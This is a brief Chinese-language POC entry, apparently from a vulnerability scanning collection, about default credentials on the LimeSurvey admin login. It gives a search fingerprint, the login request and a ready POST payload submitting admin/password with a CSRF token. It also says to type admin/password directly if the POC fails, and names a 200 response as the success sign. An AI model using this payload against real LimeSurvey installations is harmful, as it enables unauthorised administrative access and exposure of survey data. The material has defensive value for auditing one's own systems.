# LimeSurveylogin存在默认口令漏洞

LimeSurveylogin ｜ 默认口令 ｜ —
- **指纹**：`title="LimeSurvey"`
- **请求**：`GET /index.php/admin/authentication/sa/login HTTP/1.1`

**Payload**
```
**获取请求头中的csrf值**
Host:
**替换请求数据包中的csrf值**
POST /index.php/admin/authentication/sa/login HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
user=admin&password=password&YII_CSRF_TOKEN=&login_submit=login
**上述POC验证失败，直接输入账密：admin/password**
```
- **响应特征**：200